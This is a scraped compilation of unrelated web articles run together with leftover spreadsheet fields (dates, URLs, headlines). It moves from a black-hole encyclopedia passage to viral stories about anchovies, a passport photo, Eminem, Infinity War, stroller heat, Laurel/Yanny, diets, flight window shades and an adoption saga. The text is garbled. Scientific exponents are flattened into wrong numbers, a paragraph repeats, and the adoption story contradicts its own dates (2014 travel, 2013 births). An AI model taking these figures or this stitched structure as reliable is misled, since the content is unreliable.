Some galaxies lack any supermassive black holes in their centers. Although most galaxies with no supermassive black holes are very small, dwarf galaxies, one discovery remains mysterious: The supergiant elliptical cD galaxy A2261-BCG has not been found to contain an active supermassive black hole, despite the galaxy being one of the largest galaxies known; ten times the size and one thousand times the mass of the Milky Way. Since a supermassive black hole will only be visible while it is accreting, a supermassive black hole can be nearly invisible, except in its effects on stellar orbits.

In December 2017, astronomers reported the detection of the most distant quasar currently known, ULAS J1342+0928, containing the most distant supermassive black hole, at a reported redshift of z = 7.54, surpassing the redshift of 7 for the previously known most distant quasar ULAS J1120+0641.[103][104][105]

In February 2020, astronomers reported the discovery of the Ophiuchus Supercluster eruption, the most energetic event in the Universe ever detected since the Big Bang. It occurred in the Ophiuchus Cluster in the galaxy NeVe 1, caused by the accretion of nearly 270 million solar masses of material by its central supermassive black hole. The eruption lasted for about 100 million years and released 5.7 million times more energy than the most powerful gamma-ray burst known. The eruption released shock waves and jets of high-energy particles that punched the intracluster medium, creating a cavity about 1.5 million light-years wide - ten times the Milky Way's diameter.[106][36][107][108]

In February 2021, astronomers released, for the first time, a very high-resolution image of 25,000 active supermassive black holes, covering four percent of the Northern celestial hemisphere, based on ultra-low radio wavelengths, as detected by the Low-Frequency Array (LOFAR) in Europe.[109]

Hawking radiation [ edit ]

Hawking radiation is black-body radiation that is predicted to be released by black holes, due to quantum effects near the event horizon. This radiation reduces the mass and energy of black holes, causing them to shrink and ultimately vanish. If black holes evaporate via Hawking radiation, a supermassive black hole with a mass of 1011 (100 billion) M ☉ will evaporate in around 2×10100 years.[110] Some monster black holes in the universe are predicted to continue to grow up to perhaps 1014 M ☉ during the collapse of superclusters of galaxies. Even these would evaporate over a timescale of up to 10106 years.[111]

If your sole exposure to anchovies has been seeing their floppy bodies desecrating an “otherwise perfectly good” pizza, hold tight a sec: You haven’t been eating them at their best. (You wouldn’t eat raw garlic, right?) As the Queen of Italian Cookery goes on to explain, anchovies are most delightful when they are smashed and allowed to complement something else.

Anchovies are major players in Spanish, Italian, French and Greek cuisine. Hazan’s cookbook is one of many exhorting the flexibility of the silvery little fish. Anchovies and white wine can sauce a fillet of halibut. Or dissolve into a sauce of butter and capers for veal scaloppine. Or garnish beef patties. It’s clear Hazan thinks the sky’s the limit.

She’s not alone. We’ve witnessed an anchovy comeback over the last few years. Chef Seamus Mullen’s cookbook Hero Food devoted a whole chapter to their charms, lauding their health benefits—they’re high in protein, vitamins D and E, calcium, and omega-3s—as he laces them on toasts and flatbreads. Chef Jody Williams, at her French restaurant Buvette, layers anchovies with salted butter on warm toasts. And chef Alex Raij, of Spanish restaurants La Vara and Txikito, loves them with cheese, on garlic bread with tomato, and even in pasta.

A good primer on buying anchovies is here, but in a nutshell: Anchovies vary wildly in quality, from the big fat fillets and whole fish to the little oily tins you can get at the supermarket. I’d suggest you buy both. Get to know them. And don’t forget to store them in the refrigerator, as they’re perishable. Although those $2 tins from brands such as Cento and Roland are cheap, they’re delicious—especially when you break them down, mingle them with a fat like butter or olive oil, and introduce them to meat or vegetables.

This is the flavor you know and love from Caesar salad, after all: that booming saltiness and nod to the sea. All that salt needs is a luxe mouthfeel to mellow it and balance it, and then you’re off to the races. The best cooking trick I’ve picked up over the last year—a year of making Indian, Thai, Chinese, Italian and French food—is using anchovies to flavor chicken. It’s been a revelation on the level of bacon and seafood together.

After going gaga for the bite of butter, anchovies and bread at Buvette, I was determined to eat more anchovies. I tried the excellent garlic-butter-anchovy-chicken recipe in Alison Roman’s book Dining In. Incredible. But perhaps my favorite application is Melissa Clark’s chicken recipe from The New York Times. Bright capers, sautéed garlic, and lemon juice combine with plenty of anchovies, olive oil, and tender chicken thighs. The anchovies break down over high heat, eliminating their finicky texture. It was so good—bright, salty, and satisfying—I actually began cursing, aloud and alone, at my lunch plate. Later, I found myself sneaking into the fridge to break off cold pieces of chicken for myself.

As Clark emailed Health when asked how the inspiration for the recipe hit her, “It's one of my favorites. It's actually a riff on the classic Italian lamb chops sautéed with anchovies and capers.” She used chicken instead of lamb to make it “more economical and accessible.”

Of the enduring charms of the little fish, she writes, “Put anchovies in EVERYTHING!” She even has them folded into baked Brie in her next cookbook. Now that’s anchovy commitment.

So when a young woman named Chelsey managed to take a flattering photo for her passport, she thought she’d beaten the system.

She was wrong.

Chelsey and her boyfriend Reece were getting ready for a trip to Germany later this year, so they went to Costco to get passport photos taken. Here’s the photo Chelsey submitted to the passport office:

That’s a good passport photo! Not embarrassing at all.

But when the passports arrived a few weeks later, Chelsey discovered that her photo had been “distorted.” To put it mildly:

Somewhere a hat maker is looking at this and thinking “Challenge accepted.”

That’s just brutal, man. Here’s the side-by-side for the full effect:

The term “fivehead” doesn’t go nearly far enough. This is a minimum “sixhead.”

According to Reece, his girlfriend was none too pleased. “Chelsey was furious,” he told The Huffington Post. “And rightly so. She paid good money for an official ID from the State Department and it came out wrong, completely wrong, wouldn’t-pass-through-customs wrong.”

For his part, Reece was able to see the humor in the situation.

“As soon as I saw it I just started laughing,” he said. “It’s one of the funniest ‘bloopers’ I’ve ever seen … and it wasn’t mine!”

(By the way, if you’re in a relationship, you know that Reece’s reaction is the correct one.)

Reece then posted the passport screwup to Reddit, prompting some pretty solid jokes:

“When she sleeps she doesn’t have dreams, she has movies.”

“She looks like she could tell you the 5 billionth digit of pi without even breaking a sweat.”

And, “You’re dating a Conehead? Are her parental units cool with it?”

Strangely, this isn’t even the first time the State Department has done this. One man shared his own “Conehead-ed” photo:

How does this even happen?!

Lucky for Chelsey, the State Department has been working to rectify the situation. She contacted them about the mixup and they agreed to issue a new passport with the correct photo.

The only real loser is the German customs official who won’t get to see this.

Eminem's Daughter Reveals How She Really Feels About

Her Dad

It’s not uncommon for kids and teenagers to fall out with their parents, even going so far as to wish they had a different family à la Home Alone.

However, these adolescent wishes usually pass quite quickly, either due to reconciliation, realising they’re your family and you can’t change that, or simply growing up.

Advert 10

However, one woman is maintaining her strong belief, rapper Eminiem is her real father. She even has ‘proof’.

Appearing on the Dr Phil show, 20-year-old Haley stuck firm to her conviction he is her father.

The young woman also half believed Dr Phil could be her uncle (which would make him related to Slim…).

Advert 10

Trying to get his head round the idea in a logical, common sense kind of way, Dr Phil said:

I’ve been on television for 20 years – five years on Oprah then 15 years on my own show. Do you think that, some time through the last 20 years, somebody might’ve mentioned ‘by the way, your dad’s brother is Dr Phil’?

Haley replied:

There’s a lot of things that I think that people say that I’m just crazy for, but that’s what I think.

Advert 10

CBS

Cutting to the point, Dr Phil asks ‘would that make me Eninem’s brother?’

To which Haley replies:

Would it? […] No that’d probably make you his dad.

Advert 10

If Dr Phil was Eminem’s dad, we’d probably have heard about it right?

Haley said:

Well, people that are famous usually tend to not say ‘hey, this is my dad, he’s famous too’. Sometimes they have kids that they don’t even know about.

As Dr Phil tries to get to the heart of the matter, Haley’s ‘proof’ appears in the form of a photograph of Eminem next to a photograph of her dad who ‘they call Mikey’.

Advert 10

Check it out here:

Mikey, fortunately, has provided a statement on the matter.

He wrote:

My name is Michael Kristi [Haley’s mother] is my half-sister… I am Haley and Adrianna’s uncle. I am not Eminem but I did look like him and was mistaken for him in my 20s.

Haley, however, still can’t quite get her head around it.

After hearing the statement, she says:

He looks just like him, there’s no way.

I don’t know what to tell you Haley.

Perhaps this sign language translator can spell it out for you, as she seems to know a thing or two about Eminem.

A video of her converting Eminem’s lyrics into visuals – in real time live at a concert nonetheless – went viral recently.

Check it out:

The interpreter, named Holly Maniatty, has been praised for her awesome sign language skills and ability to translate Slim’s lyrics for the hearing-impaired.

Eminem, 45, also known as Marshall Mathers, has sold an eye-watering 172 million albums worldwide, and while he does have a daughter, also called Hailie, it’s definitely not the one who was just on Dr Phil (the different spelling of their names might be just one giveaway.)

In fact, Eminem and daughter Hailie Jade Scott have been spending some quality time together at music festivals across America this year.

The 22-year-old has been ‘crashing’ dates on her dad’s tour, crystallising the special moments with pictures, not of her weird uncle, but with the real Slim Shady.",Girl Claims She Has Proof Eminem Is Her Real Dad,

One Marvel fan, though, has gone back to the theaters to see Avengers: Infinity War 42 times and counting.' Going by Nem: The Infinity Watcher on Twitter, the Charlotte native video game streamer and independent music creator has gone to see the Marvel Studios ensemble flick more than anyone else and has the receipts to prove it. On Wednesday, Nem went to his local theater to see it for the 42nd time, posing in front of the Avengers: Infinity War poster with a Black Panther t-shirt on. Check it out... The answer to life, the universe and everything. 42nd time watching #InfinityWar pic.twitter.com/MmHH96chlh — Nem: The Infinity Watcher (@NemRaps) June 6, 2018 Now, naturally, skepticism will set in. At about $15 a ticket, this would mean Nem has spent somewhere close to $630 on tickets to Avengers: Infinity War assuming he isn't using a MoviePass or some other sort of coupon. Surely, this isn't real, right? Wrong. Nem has all of the supporting evidence.

The Beginning The thread began on May 2, just a few days after the initial release of Avengers: Infinity War. Nem went out to the theaters to watch the movie again, having already seen it five times. Here is the first tweet of his now 42-time marathon... 6th day watching #InfinityWar pic.twitter.com/65gaweeLdx — Nem: The Infinity Watcher (@NemRaps) May 2, 2018 At the time, no one knew how much of an obsession Nem actually had with Avengers: Infinity War.

Marathon and a Sprint Two weeks later, Nem was on Day 14 of his marathon which called for watching Avengers: Infinity War every single day.

So many kids and Mothers in the theater today. Worst combination of people.

The dangerous stroller mistake
parents make in the hot weather

You want to keep your baby cool on hot spring or
summer days, but make sure you don't do this when
you go out for a walk.

TODAYSPARENT.COM
",5/06/2018 12:25,https://www.todaysparent.com/baby/baby-health/the-dangerous-stroller-mistake-parents-make-in-the-summer/,"You want to keep your baby cool on hot spring or summer days, but make sure you don't do this when you go out for a walk.

Throwing a cover over the stroller when out and about with your baby might seem like an obvious way to keep her cool and protected from the sun on a hot summer day. (Since babies under six months can’t wear sunscreen, many moms and dads make sure the stroller is fully shaded.) But some parents are actually making matters worse, says Svante Norgren, a paediatrician at the Astrid Lindgren Children’s Hospital in Stockholm. Norgren told a local newspaper that even a thin muslin blanket can make conditions inside a stroller uncomfortably hot, and put your baby at risk. “It gets extremely hot down in the pram, something like a thermos,” Norgren told Swedish newspaper Svenska Dagbladet.

The newspaper tested Norgren’s theory and found that after 90 minutes, an uncovered buggy heated up to 22 degrees, while a stroller with a thin covering reached 34 degrees in just 30 minutes. After an hour in the sun, it was a scary 37 degrees.

These findings don’t surprise Anne Rowan-Legg, a paediatrician at Children’s Hospital of Eastern Ontario and assistant professor in the paediatrics department at the University of Ottawa. She says it’s a lack of airflow that causes the temperatures inside covered strollers to soar. “Temperatures can rise quite quickly in a confined covered space, just like in a car,” she says. And that can pose a serious risk to little ones.

“Babies and young children are more vulnerable to the heat than older children and adults,” says Rowan-Legg. That’s because they sweat less, their ability to regulate body temperature is less efficient and they can’t tell you when they’re feeling too hot. This puts them at increased risk of heat-related illness, dehydration, heat exhaustion and heat stroke.

Infants and young children who are suffering from exposure to extreme heat may show signs of faintness, extreme tiredness and intense thirst. Other signs of heat-related illness include vomiting, quick breathing and restlessness, and heat can make existing illnesses or medical conditions worse.

That doesn’t mean you have to be cooped up during a heat wave, though. Keep little ones safe while you stroll by following these guidelines:

-Instead of a blanket, use a large canopy, or a mesh or perforated sun shield designed for strollers. These will keep baby shaded while ensuring adequate airflow.

-Dress baby in lightweight, loose-fitting clothing.

-Give your baby more fluids than usual, to keep him hydrated.

-Avoid peak hours and stick to the shade as much as possible.

-Check on little ones often, feeling their skin to ensure they’re cool.

If you don’t have air conditioning at home to help your family cool off after an outing, be strategic and plan breaks at a coffee shop or café with AC. “Seek comfort at a public library, the mall or a community shelter provided especially for relief from the heat,” says Rowan-Legg.",The dangerous stroller mistake parents make in the hot weather,

",30/05/2018 10:25,https://www.iflscience.com/brain/the-guy-behind-the-laurel-or-yanny-clip-reveals-what-he-actually-said/,"It’s the audio illusion that divided the Internet. Was it Laurel or was it Yanny?

First shooting to the fore last week, the short clip of a person saying one of those two names caused chaos. Some heard one word, others heard the other, and some could switch between the two, drawing obvious similarities to The Dress.

The exact cause of this difference isn’t entirely clear. Some have suggested that it may be the result of the bass on your speakers. Raising or lowering the volume can apparently trigger the switch from one name to the other.

Others have said this is a “perceptually ambiguous stimulus”, meaning that the brain can’t decide which one is right. Your age may play a factor in deciding which one you hear, as could the word you’re actually expecting to hear.

One researcher is even conducting a survey to try and get to the bottom of it. Pascal Wallisch from New York University told IFLScience he would be conducting a study to try and settle Yannygate once and for all.

This does beg the question though, what was the voice that originally said the word actually saying? That, my friend, has been answered.

-

The recording was made by 64-year-old actor-singer Jay Aubrey Jones for the website Vocabulary.com. They were looking for people to say words into a microphone to help teach people new words. And on this occasion in 2007, they asked Jones to say quite a few, including this one: Laurel.

“I recorded my batch of words,” he told Time, “and I thought that was that.”

Yes, that’s right. The original word spoken was “Laurel”, which makes the Yannygate thing all the weirder. It wasn’t recorded with an illusion in mind, but merely one of thousands of words in a day’s work.

Jones, for his part, mostly hears Laurel, although he said he can also hear “a slight trace of ‘Yanny’”. And he said it made him laugh that people were so interested in the recording, considering “all the things that are going on in the world right now.”

So there you have it, straight from the speaker’s mouth himself. Now we can put these audio illusion things to bed. Ah, wait.","The Guy Behind The ""Laurel or Yanny"" Clip Reveals What He Actually said",

Change, Say Harvard Scientists

Up to a third of early deaths could be prevented if we all switched to a vegetarian
diet, according to new calculations by Harvard Medical School...

SCIENCEALERT.COM
",25/05/2018 19:06,https://www.sciencealert.com/third-of-early-deaths-could-be-prevented-with-diet-change-vegetarian,"Up to a third of early deaths could be prevented if we all switched to a vegetarian diet, according to new calculations by Harvard Medical School scientists.

While we already know about many of the benefits of not eating meat, this latest figure is much higher than previous estimates.

The researchers presented the figures at the Unite to Cure Fourth International Vatican Conference in Vatican City last week.

The work is yet to be published in a peer reviewed journal, so we need to be skeptical about these numbers for now. But such bold claims are worth further investigation.

Estimates vary between countries but roughly 30 million deaths every year across the globe are classed as ""preventable"" – those caused by things we can arguably do something about, such as obesity, smoking, poor diet, and so on.

Cutting those numbers down by a third would be a massive achievement.

And according to researchers from Harvard Medical School, switching to a plant-based diet could play a bigger part in that than previously realised.

""We have just been doing some calculations looking at the question of how much could we reduce mortality shifting towards a healthy, more plant based diet, not necessarily totally vegan, and our estimates are about one third of deaths could be prevented,"" said one of the team, Walter Willett, as reported by The Telegraph.

""That's not even talking about physical activity or not smoking, and that's all deaths, not just cancer deaths. That's probably an underestimate as well as that doesn't take into account the fact that obesity is important and we control for obesity.""

As we mentioned earlier, we haven't seen a paper on this yet, and other scientists have yet to analyse the figures produced by Willett and his colleagues.

Even so, other attendees at the conference agreed that a vegetarian diet could do more for stopping preventable deaths than previous studies suggested.

In short, a healthier diet has a knock-on effect on almost every other aspect of the body's health.

David Jenkins, from the University of Toronto in Canada, was also at the Unite to Cure event and presented research looking at lowland gorilla diets – rich in stems, leaves, vines and fruit.

When the same diet was recreated for humans, it led to a 35 percent fall in their cholesterol in just two weeks.

So what is it that makes these diets so good for us?

The nutrients in a properly managed vegetarian diet are known to lower blood pressure, reduce the risk of a heart attack, and lower body mass index (BMI).

At the same time, studies have shown that eating certain red meats increases your risk of cancer.

Add to that the environmental benefit of not having livestock to look after and manage, and the benefits of a meat-free diet quickly begin to stack up.

At the same time, vegetarians also need to be careful about what they eat – particularly in making sure they get the protein, calcium, iron, and vitamin B12 typically provided by meats. So it's definitely not a case of one diet being perfect for all humans.

What this latest research suggests is that cutting back on meat could be better for us than we ever realised – at least in terms of avoiding an early death. And that could help inform all of our diets, whether we completely give up meat or not.

""I think people imagine that a healthy diet has only a modest effect and a vegetarian diet might help you lose a little bit of weight,"" Neal Barnard, president of the Physicians Committee for Responsible Medicine, told the conference, as The Telegraph reports.

""But when these diets are properly constructed I think they are enormously powerful.""","A Third of Early Deaths Could Be Prevented by This Diet Change, Say Harvard Scientists",

While most people were loving the simplistic pen bateau neckline and vaguely cinched in waist, the 33-year-old singer felt that the ensemble could’ve looked a hell of a lot better if it had been slightly more fitted.

Let's get checking out a bunch of regular guys trying eyebrow makeup for the first time...

In an interview with Entertainment Tonight, Katy responded: “I would have done one more fitting!” when questioned about the dress, before going on to give a cheeky wink down the camera.

Designer Clare Waight Keller, who became the first female artistic director of Givenchy last year, said of the creation: “There was a conversation early on about the story that we were going to tell through this wedding.

“Part of what I wanted to do was talk to her about what type of stories they could be,"" she told People. ""The fact that her and Prince Harry will be working a lot in the Commonwealth was something that I thought was really intriguing and could be something built on to be part of the day.”

Meghan also paid tribute to Britain by wearing a six-foot veil made up of flowers from each of the fifty-two Commonwealth countries, before finishing off the look with a gorgeous Queen Mary Diamond Bandeau tiara made in 1932.

",13/05/2018 16:37,https://www.iflscience.com/brain/want-lose-weight-train-brain-not-body/,"Despite massive government, medical and individual efforts to win the war on obesity, 71 percent of Americans are overweight. The average adult is 24 pounds heavier today than in 1960. Our growing girth adds some US$200 billion per year to our health care expenditure, amounting to a severe health crisis.

Drug research has not yielded a pill that helps people lose weight and keep it off. Traditional approaches such as diet and exercise can work short-term, but people almost inevitably regain the weight. Randomized controlled trials of weight loss surgery have shown some improvements in diabetes but not in mortality, cancer and cardiovascular disease.

If there is ever to be a “pill” – a solution to weight – it will be changing the brain, particularly the primitive areas of the brain, the “emotional brain” or mammalian and reptilian brain. These areas house circuits that control stress and our stress-fueled emotions, thoughts and behaviors. These circuits can be rewired in humans so by changing them, we have a chance to address the root cause of stress-related problems, including obesity. While some overweight and obesity are caused by genetic make-up, more and more research is indicating that stress plays a big role in weight gain. Many people under stress turn to food for comfort.

My colleagues and I set out to develop a neuroscience-based approach to weight management and dealing with the common excesses we all face, through emotional brain training. The idea was to use neuroscience-based tools to change the brain so that the whole range of common excesses would fade. The method has shown promising results.","The Weight Loss ""Secret"" That No One Is Telling You",

And as in all countries, you will have to pass a practical driving test. But what happens when you fail the exam? (the article continues after the ad)

According to a Swiss law, if you fail the practical driver’s license test three times, you are required to consult an official psychologist to assess the reasons for your previous failures before you are allowed to retake the exam! Once the psychologist reports that you are once again ready to take the exam, you can retry.

Here's Why Flight Attendants Ask You to Raise the Window Shade

Nikki Vargas Travel Editor 12 December 2017 View

When flying, passengers are often subjected to various rules and regulations with purposes that are not immediately clear. Why do fliers need to have their seat backs straight for take off and landing? Does an active cellphone really interfere with the plane’s signal? Why do window shades have to be raised for landing?

For the window shade question, at least, we now finally have an answer. According to CN Traveler, “the reason fliers have to open and close their window shades is not for the amusement of the flight attendant, better views of the world below, for sunburn protection, or to prepare you for that jolt of landing: it’s primarily for safety.”

In case of an emergency, flight attendants are tasked with the daunting feat to evacuate an aircraft in 90 seconds or less—according to U.S. regulations. Passengers are asked to keep their window shades open during take off and landing as these are when most aviation accidents occur, and the windows allow flight crew to assess an emergency situation and determine which exit is best used.

Natural light is also a factor in a smooth emergency exit. “By allowing natural light to flood into the cabin, a sudden exit into the sunny outdoors is less disorienting for passengers and crew alike, and evacuees, the thinking goes, will be better able to move away from the plane,” reports Kristen Leigh Painter of CN Traveler.",Here's Why Flight Attendants Ask You to Raise the Window Shade,

Unexpected News

When Sarah and Andy struggled to conceive a baby, they decided to adopt. One
week after they adopted triplets, they received some shocking news!
NINJAJOURNALIST.COM

",8/05/2018 17:35,https://www.ninjajournalist.com/science/one-week-after-couple-adopts-yh/,"

Family of Two Sarah and Andy Justice were happy and loved their life together. They always knew they wanted to grow their family and become parents. After years of trying to conceive, Sarah and Andy decided to give adoption a try. After an excruciating process, the couple was finally given babies. This tearjerking real-life story of what happened right after the adoption will be sure to surprise you.

Pregnancy Trouble After three years of marriage, the Justices felt something was missing. They decided it was time to grow their family. Unfortunately, having babies was not easy for the Justices. For three long years, the sweet couple tried to have babies naturally with no success. Struggling to get pregnant began to put a strain on their marriage. Times were tough but they finally decided it was time to try something else. Sarah and Andy tried to find a fertility doctor.

Fertility Expert Sarah and Andy Justice lived in Tulsa, Oklahoma. Once they decided to go to a fertility specialist, the couple had trouble finding a good fertility specialist in their hometown. Eventually, they found a doctor that could help them get pregnant, but there was one inconvenience. The fertility specialist they wanted was all the way in St. Louis, MO. Even though the distance posed a problem, Sarah and Andy were determined to have kids and they would not let anything get in their way.

More Bad News Getting to Missouri from Oklahoma for fertility treatment was quite a mission for Sarah and Andy. The year was 2014 and the couple left their home in Tulsa, Oklahoma and trekked to a doctor’s office in Missouri. The Justices were so determined to get pregnant that they drove for six long hours to reach the fertility expert in Missouri. Sadly, once they arrived in Missouri, Sarah and Andy received disappointing news. The visit was not successful and it seemed that there was no change Sarah could get pregnant.

In Vitro The fertility specialist had some unfortunate news for the Justices. The specialist told Sarah and Andy that even though they were good candidates for in-vitro fertilization, their chance of getting pregnant was still only 10%. Also, the process of in-vitro fertilization was much more invasive than the couple realized. Besides being really invasive, in-vitro fertilization is also incredibly expensive. Still, the Justices were not out of luck. Even though plan A and plan B did not work out, they were ready to turn to plan C!

Too Expensive The process of in vitro fertilization is not cheap at all and can range from about $12,000- $15,000 for a basic IVF cycle. The fertility treatment is rarely covered by insurance. If the Justices went through with IVF, they found out they would have to pay between $30,000 and $60,000 just to try to get pregnant. The high cost and the low likelihood that IVF would work had the Justices thinking outside of the box. Adoption became the logical next step.

Adoption Andy and Sarah would stop at nothing to become parents. Because the Justices wanted to be parents more than anything they decided to begin the adoption process. As many people know, the adoption process can be grueling and at times even as frustrating as trying to conceive naturally. Way before the point of bringing a child home, the Justices first needed to apply to an adoption agency. Then, once the agency reviews and accepts the application, Sarah and Andy had to complete a home study.

Anything for a Baby Every step of the way, the Justices were met with hurdles to jump over. All they wanted was to provide a wonderful home for a child, but adoption is no easy process. While the adoption route presented many more obstacles to get through, Sarah and Andy would stop at nothing to figure out a way to have children. They knew that getting through the adoption system could take years. Nevertheless, Sarah and Andy wanted a newborn baby and were determined to do anything.

Interviews After applying to an adoption agency and going through a home study, the next step is to interview. Just thinking about interviews gives most people some anxiety, but they are a huge part of the adoption process. Sarah and Andy had to go through a series of interview with prospective birth mothers. These high-pressure interviews would determine whether or not the Justices would be able to adopt a baby. By the end, the Justices were drained and exhausted. Unfortunately, Sarah and Andy’s struggle was not even close to over.

Seeking Approval After an extensive interview process, the Justices finally got some good news. One birth mom decided to give the Justices her baby! Sarah and Andy could not believe the good news. All they wanted was to hold their new child! The Justices made sure to support the birth mother through her pregnancy, they couldn’t wait to meet their new family member. Sadly, just as their dream of having a baby began to come to fruition, things took a turn for the worst.

Last Minute Change Just when Sarah and Andy thought they were done waiting for a baby, the birth mom changed her mind at the last minute. The birth mother decided to keep the baby, and the devastating news completely broke the Justices. Even though Sarah and Andy were heartbroken, they decided to move on and try again. The resilient couple was nowhere near ready to give up and move on. Sarah and Andy knew they were meant to be parents.

Moving On Still, in the midst of heartache and disappointment, Sarah and Andy decided to push on with the adoption process. They recontacted the adoption agency and let them know they still wanted to adopt. The Justices went on another interview and found another birth mother that wanted to give her baby to the Justices. Again, just as things were moving forward, the second birth mother backed out of the plan and decided to keep her baby at the last minute.

Overcoming Obstacles Understandably, Sarah and Andy were disappointed and almost completely discouraged. Still, they continued to pray for the family they wanted. Somehow, the couple persevered and found the strength within themselves to keep trying. No matter what happened, the Justices would never be ready to call it quits. Little did they know that good news was right around the corner. Very shortly after the second birth mom backed out of the adoption, Andy and Sarah received one more call.

One Last Chance Just at the moment when the Justices were at their lowest, Sarah received a call that would change the course of her and Andy’s life. For the first time in a while, the phone rang with good news. Again the agency called to let the Justices know that there was a pregnant woman who chose Sarah and Andy to be the parents of her unborn child. There was something different about this birth mother that seemed promising.

Babies The Justices met with the birth mom and she even included them in an ultrasound appointment with her. While Sarah and Andy and the birth mother were at the doctor’s appointment, something peculiar showed up on the scan. At first, the Justices were nervous, but this time the surprise was a good one! Everything looked normal and the baby was healthy…or should we say, babies! The doctor saw three separate and strong heartbeats show up on the ultrasound monitor.

Family of Five Seeing three separate hearts beating on the ultrasound monitor completely shocked the birth mother and Sarah and Andy. The Justices struggled to get one baby, so three babies seemed like a fantasy. There was no chance Andy and Sarah were going to back out now. They knew those three babies were meant to be their children, so they decided to move forward with the adoption process. Sarah and Andy were ready to become the parents they had always dreamed of being.

Not Prepared

Despite the fact that the Justices had been trying for years to have kids, they were not prepared to have so many at one time. Getting pregnant with triplets naturally is pretty rare. Just as Sarah and Andy always do, they saw the best of a challenging situation. They had wanted to have more than one child eventually, so instead of having to go through the adoption process multiple times to have kids, they were able to get the family they wanted in one go. Despite the fact that the Justices had been trying for years to have kids, they were not prepared to have so many at one time. Getting pregnant with triplets naturally is pretty rare. Just as Sarah and Andy always do, they saw the best of a challenging situation. They had wanted to have more than one child eventually, so instead of having to go through the adoption process multiple times to have kids, they were able to get the family they wanted in one go.

Baby Proofing Sarah and Andy got to work immediately. They could not wait to meet their new babies and they wanted their home to be ready for when they arrived! The Justices started buying cribs and strollers. They purchased all of the major baby necessities and baby proofing their whole house. Their dream of becoming parents had been a long time coming. Now, Sarah and Andy could finally be the parents they dreamed of and they could not have been more excited!

Party of Five It was May 2013 and the time finally arrived for Andy and Sarah to meet their new babies! The birth mother’s water broke and she went into labor eight weeks early. Andy and Sarah met the birth mom at the hospital and waited patiently for hours anticipating the arrival of their new babies. Finally, after a long and hard labor, the birth mother delivered three tiny three-pound babies. The newborn triplets, Hannah, Joel, and Elizabeth were ready to meet their new parents.

Premature Newborns The fact that Hannah, Joel, and Elizabeth were born eight weeks early was a little bit alarming for new parents, Sarah and Andy. Because they were born prematurely, the triplets had to stay in the neonatal intensive care unit for some time before they were allowed to be taken home. While in the hospital, the newborn babies developed more and more. Each day the triplets grew stronger until they could finally leave the hospital and go home with their new parents.

One Week Later Just one week after the triplets were born, Sarah began to feel sick. The adoption process and birth of the triplets had been very stressful on the Justices, so Sarah decided to visit her doctor to check on her health. The new mom wanted to make sure she was healthy enough for the triplets to come home. The doctor thoroughly examined Sarah and tested her for various illnesses. After some time, the doctor returned after he found out why Sarah wasn’t feeling well!

Sarah’s Pregnant When the doctor returned to the waiting room, he let Sarah know that she was not sick at all. After the doctor ran a series of tests, he discovered that Sarah was actually pregnant! The good news was almost too shocking to believe. Understandably, Sarah was completely surprised by the miracle of her pregnancy. After many years of trying to conceive, she was finally pregnant one week after she adopted triplets! Still, there was one more huge surprise though…

Twins The doctor told Sarah that she was pregnant with another set of multiples! The new mom of triplets was now pregnant naturally with twins after years of thinking she was barren! If anyone else was in the same situation as Andy and Sarah, they probably would feel that this new pregnancy came at the worst time. As we know by now, Sarah and Andy aren’t like anyone else. They take each challenge they are faced with and find the positive in it.

Blessings The Justices saw the humor in the situation they were in could not have been happier! Still, they couldn’t believe they were having five babies all under the age of one! Even though the new parents were overwhelmed by the news of multiple multiples, they were still so excited to grow their family even more. Sarah and Andy took a tough situation and moved forward with it. The Justices saw the new pregnancy as a blessing. They could not wait to meet their biological twins.

Family of Seven A few more months passed, and just as the Justices were getting used to life with the triplets, Sarah went into labor. The twins were on their way into the world and ready to join this new and growing family. Finally, after a long labor, Sarah delivered her new twins, Andrew and Abigail. Everything went well and Sarah and Andy were ecstatic and ready to adjust to life with five babies. Life with five new babies was a huge change!

How To Feed A Large Family Fortunately, with the help of the community, family, and friends, Sarah and Andy got all the support they needed. As the Justices adjusted to life without much sleep, members of Tulsa’s Eastland Baptist Church came to Sarah and Andy’s rescue in the nick of time. The church members were ready to chip in and help by donating food to the new family of seven. Community members cooked meals for the Justices and even sent them baby formula.

Community Help Some friends even offered to help babysit while the couple was at work. Friends and church members were not the only people to offer their times and money. Donations poured in from all over the state. Total strangers pitched in by sending diapers, bottles, blankets, and clothes. Sarah and Andy were so grateful because they really needed the help and the extra diapers. The new family of seven was going through more than 300 diapers and 84 bottles a week!

Huge Changes The new family of seven grew so much that they needed to rearrange many things. Their schedules completely shifted, and they had to buy a bigger van. They also had to learn how to tell all of their babies apart. Sarah and Andy decided to paint their babies’ toenails with different nail polish colors to remember which baby was which. The nail polish system made it much easier for Sarah and Andy to distinguish each child and figure out feeding and changing schedules.

They Went Viral It did not take long for the Justice’s remarkable story to hit the internet and go viral. Once the family’s phenomenal story spread, the Justices became internet sensations. Everyone wanted to know about the family of seven. At first, the Justice’s story garnered attention from Facebook and they gained tons of followers. Soon after, people all over the world were interested in seeing the family’s photos and updates. Then, shortly after the story went viral, the family discovered one more huge surprise!

Family of Eight Though it may be hard to believe, Sarah found out she was pregnant again! The Justice’s welcomed their sixth baby in 2016! Even though the Justices already had their hands full with six children, they both agreed that they wouldn’t have it any other way. Sarah and Andy Justice love being parents more than anything and they couldn’t wait to add another baby to their family. Sarah told the Today show, “It was something we’ve wanted so badly that we love it. We just really love having these children.”

What’s One More If you already have five children in one year, adding one more in two years is a piece of cake. The Justices are used to having their hands full at all times, so adding another baby into an already full household was not too overwhelming. In some ways, having their sixth baby was easier because it was Sarah and Andy’s first non-multiple child! On the other hand, six young kids at the same time definitely pose some unique challenges.

Baby #6 It is no surprise that having eight people under one roof can get pretty hectic. Just remembering each child’s name can get a little confusing. The oldest triplets are Joel, Hannah, and Elizabeth. The twins, Abigail and Andrew arrived a couple months after the trio. Most recently, baby number six joined the squad. Despite the family’s challenges, they are a pretty happy bunch. Just take a peek at how adorable all of the kids look celebrating the fourth of July!

Potty Training So, who is the newest member of the Justice family? A precious baby boy named Caleb joined the Justice clan in 2016. Around the time he was born, the triplets turned four years old and the twins turned three and a half years old. For the family of eight, home has become a place that is loud and busy, to say the least. Luckily for Sarah and Andy, most of their children are out of diapers and in the process of potty trained.

Dream Come True In an interview with Babyology, Sarah Justice opened up and got candid about life with six kids under the age of five. She shared, “Having a number of children is a dream come true. When you wait for something you appreciate it that much more when you get it.” After years of trying to have kids, the mother of six was so grateful for her opportunity to be a mom that she doesn’t even mind being so busy.

